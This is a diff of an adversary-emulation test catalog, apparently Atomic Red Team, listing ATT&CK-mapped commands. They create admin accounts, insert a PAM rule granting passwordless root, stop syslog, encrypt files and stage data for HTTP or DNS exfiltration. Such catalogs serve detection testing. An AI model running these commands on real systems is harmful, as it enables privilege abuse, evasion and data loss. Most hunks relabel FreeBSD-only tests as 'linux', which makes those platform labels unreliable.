+","input_arguments.task_name.description: Name of the newly-added task
+
+input_arguments.task_name.type: string
+
+input_arguments.task_name.default: lilghostie
+
+input_arguments.task_command.description: Command you want the task to execute
+
+input_arguments.task_command.type: string
+
+input_arguments.task_command.default: notepad.exe
+
+input_arguments.target.description: System where the task should run
+
+input_arguments.target.type: string
+
+input_arguments.target.default: localhost
+
+input_arguments.user_name.description: Username to authenticate with, such as ATOMICDOMAIN\AtomicAdmin
+
+input_arguments.user_name.type: string
+
+input_arguments.user_name.default: $env:USERDOMAIN + '\' + $env:USERNAME
+
+"
 T1078.003,Valid Accounts: Local Accounts,Create local account with admin privileges,a524ce99-86de-4db6-b4f9-e08f35a47a15,After execution the new account will be active and added to the Administrators group,windows,,,"net user art-test /add
 net user art-test #{password}
 net localgroup administrators art-test /add",command_prompt,True,,"net localgroup administrators art-test /delete >nul 2>&1
@@ -22747,7 +22885,7 @@ exit
 ",bash,True,,"userdel -r art 
 ",,,
 T1078.003,Valid Accounts: Local Accounts,Create local account (FreeBSD),95158cc9-8f6d-4889-9531-9be3f7f095e0,"An adversary may wish to create an account with admin privileges to work with. In this test we create a ""art"" user with the password art, switch to art, execute whoami, exit and delete the art user.
-",freebsd,,,"pw useradd art -g wheel -s /bin/sh
+",linux,,,"pw useradd art -g wheel -s /bin/sh
 echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0      
 su art
 whoami
@@ -22770,7 +22908,7 @@ exit
 T1078.003,Valid Accounts: Local Accounts,Reactivate a locked/expired account (FreeBSD),09e3380a-fae5-4255-8b19-9950be0252cf,"A system administrator may have locked and expired a user account rather than deleting it. ""the user is coming back, at some stage"" An adversary may reactivate a inactive account in an attempt to appear legitimate. 
 
 In this test we create a ""art"" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.
-",freebsd,,,"pw useradd art -g wheel -s /bin/sh
+",linux,,,"pw useradd art -g wheel -s /bin/sh
 echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0
 pw lock art
 pw usermod art -e +1d
@@ -22794,7 +22932,7 @@ cat /etc/passwd |grep nobody
 # -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 ",,,
 T1078.003,Valid Accounts: Local Accounts,Login as nobody (freebsd),16f6374f-7600-459a-9b16-6a88fd96d310,"An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin.
-",freebsd,,,"cat /etc/passwd |grep nobody 
+",linux,,,"cat /etc/passwd |grep nobody 
 # -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
 pw usermod nobody -s /bin/sh
 echo $(openssl passwd -1 art) | pw mod user nobody -h 0
@@ -23469,7 +23607,7 @@ T1007,System Service Discovery,System Service Discovery - systemctl,f4b26bce-4c2
 ",linux,,,"systemctl --type=service
 ",bash,,,,,,
 T1007,System Service Discovery,System Service Discovery - service,b2e1c734-7336-40f9-b970-b04731cbaf8a,"Enumerates system service using service
-",freebsd,,,"service -e
+",linux,,,"service -e
 ",sh,,,,,,
 T1543.004,Create or Modify System Process: Launch Daemon,Launch Daemon,03ab8df5-3a6b-4417-b6bd-bb7a5cfd74cf,"Utilize LaunchDaemon to launch `Hello World`
 ",macos,,,"sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
@@ -23518,7 +23656,7 @@ input_arguments.bash_history_filename.default: ~/.bash_history
 
 "
 T1552.003,Unsecured Credentials: Bash History,Search Through sh History,d87d3b94-05b4-40f2-a80f-99864ffa6803,"Search through sh history for specifice commands we want to capture
-",freebsd,,,"cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}
+",linux,,,"cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}
 ",sh,,,,,,"input_arguments.output_file.description: Path where captured results will be placed
 
 input_arguments.output_file.type: path
@@ -23770,7 +23908,7 @@ input_arguments.index.default: 1
 T1556.003,Modify Authentication Process: Pluggable Authentication Modules,Malicious PAM rule (freebsd),b17eacac-282d-4ca8-a240-46602cf863e3,"Inserts a rule into a PAM config and then tests it.
 
 Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
-",freebsd,,,"sudo sed -i """" ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}
+",linux,,,"sudo sed -i """" ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}
 ",sh,True,,"sudo sed -i """" ""/#{pam_rule}/d"" #{path_to_pam_conf}
 ",,,"input_arguments.path_to_pam_conf.description: PAM config file to modify.
 
@@ -23848,7 +23986,7 @@ cd $finalpath
 stop-process -Name ""Calculatorapp"" -Force 
 dismount-diskimage -ImagePath ""$env:TEMP\qbot-test.iso""",,,
 T1486,Data Encrypted for Impact,Encrypt files using gpg (FreeBSD/Linux),7b8ce084-3922-4618-8d22-95f996173765,"Uses gpg to encrypt a file
-",freebsd,linux,,"echo ""#{pwd_for_encrypted_file}"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
+",linux,,,"echo ""#{pwd_for_encrypted_file}"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
 ",sh,False,,"rm #{encrypted_file_path}
 ",bash,"dependencies.0.description: Finds where gpg is located
 
@@ -23882,7 +24020,7 @@ input_arguments.encryption_alg.default: AES-256
 
 "
 T1486,Data Encrypted for Impact,Encrypt files using 7z (FreeBSD/Linux),53e6735a-4727-44cc-b35b-237682a151ad,"Uses 7z to encrypt a file
-",freebsd,linux,,"$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}
+",linux,,,"$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}
 ",sh,False,,"$which_7z e #{encrypted_file_path}
 rm #{encrypted_file_path}
 ",bash,"dependencies.0.description: Finds where 7z is located
@@ -23911,7 +24049,7 @@ input_arguments.input_file_path.default: /etc/passwd
 
 "
 T1486,Data Encrypted for Impact,Encrypt files using ccrypt (FreeBSD/Linux),08cbf59f-85da-4369-a5f4-049cffd7709f,"Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.
-",freebsd,linux,,"if [ $USER == ""root"" ]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi
+",linux,,,"if [ $USER == ""root"" ]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi
 ",sh,False,,"if [ $USER == ""root"" ]; then mv #{cped_file_path} #{root_input_file_path}; else cp #{cped_file_path} #{user_input_file_path}; fi 
 ",sh,"dependencies.0.description: Finds where ccencrypt and ccdecrypt is located and copies input file
 
@@ -23947,7 +24085,7 @@ input_arguments.impact_command.default: sudo su
 
 "
 T1486,Data Encrypted for Impact,Encrypt files using openssl (FreeBSD/Linux),142752dc-ca71-443b-9359-cf6f497315f1,"Uses openssl to encrypt a file
-",freebsd,linux,,"$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
+",linux,,,"$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
 $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}
 $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
 ",sh,False,,"$which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}
@@ -24403,7 +24541,7 @@ Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/mast
 T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Exfiltration Over Alternative Protocol - HTTP,1d1abbd6-a3d3-4b2e-bef5-c59293f46eff,"A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.
 
 Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.
-",macos,linux,freebsd,,manual,,"1. Victim System Configuration:
+",macos,linux,,,manual,,"1. Victim System Configuration:
 
     mkdir /tmp/victim-staging-area
     echo ""this file will be exfiltrated"" > /tmp/victim-staging-area/victim-file.txt
@@ -24435,7 +24573,7 @@ input_arguments.ip_address.default: 127.0.0.1
 
 "
 T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Exfiltration Over Alternative Protocol - DNS,c403b5a4-b5fc-49f2-b181-d1c80d27db45,"Exfiltration of specified file over DNS protocol.
-",freebsd,linux,,,manual,,"1. On the adversary machine run the below command.
+",linux,,,,manual,,"1. On the adversary machine run the below command.
 
     tshark -f ""udp port 53"" -Y ""dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches "".domain"""" >> received_data.txt
 
@@ -24577,7 +24715,7 @@ T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/
 ",linux,,,"if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
 ",sh,False,,,,,
 T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Python3 http.server (freebsd),57a303a2-0bc6-400d-b144-4f3292920a0b,"An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3.9 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.
-",freebsd,,,"if [ $(which python3.9) ]; then cd /tmp; python3.9 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+",linux,,,"if [ $(which python3.9) ]; then cd /tmp; python3.9 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
 ",sh,False,,,,,
 T1562.001,Impair Defenses: Disable or Modify Tools,Disable syslog,4ce786f8-e601-44b5-bfae-9ebb15a7d1c8,"Disables syslog collection
 ",linux,,,"#{flavor_command}
@@ -24614,7 +24752,7 @@ input_arguments.cleanup_command.default: systemctl start rsyslog ; systemctl ena
 
 "
 T1562.001,Impair Defenses: Disable or Modify Tools,Disable syslog (freebsd),db9de996-441e-4ae0-947b-61b6871e2fdf,"Disables syslog collection
-",freebsd,,,"service syslogd stop
+",linux,,,"service syslogd stop
 sysrc syslogd_enable=""NO""
 ",sh,True,,"sysrc syslogd_enable=""YES""
 service syslogd start
@@ -25061,7 +25199,7 @@ echo 3> /proc/sys/vm/drop_caches
 ",sh,True,,,,,
 T1562.001,Impair Defenses: Disable or Modify Tools,Disable Memory Swap,e74e4c63-6fde-4ad2-9ee8-21c3a1733114,"disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional 
 payload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.
-",freebsd,linux,,"swapon -a 
+",linux,,,"swapon -a 
 sleep 2
 swapoff -a
 sync
@@ -25299,7 +25437,7 @@ input_arguments.execstartpost_action.default: /bin/touch /tmp/art-systemd-execst
 
 "
 T1543.002,Create or Modify System Process: SysV/Systemd Service,Create SysV Service,760fe8d2-79d9-494f-905e-a239a3df86f6,"This test creates a SysV service unit file and enables it as a service.
-",freebsd,,,"echo '#\!/bin/sh' > #{rc_service_path}/#{rc_service_file}
+",linux,,,"echo '#\!/bin/sh' > #{rc_service_path}/#{rc_service_file}
 echo ' ' >> #{rc_service_path}/#{rc_service_file}
 echo '#' >> #{rc_service_path}/#{rc_service_file}
 echo '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file}
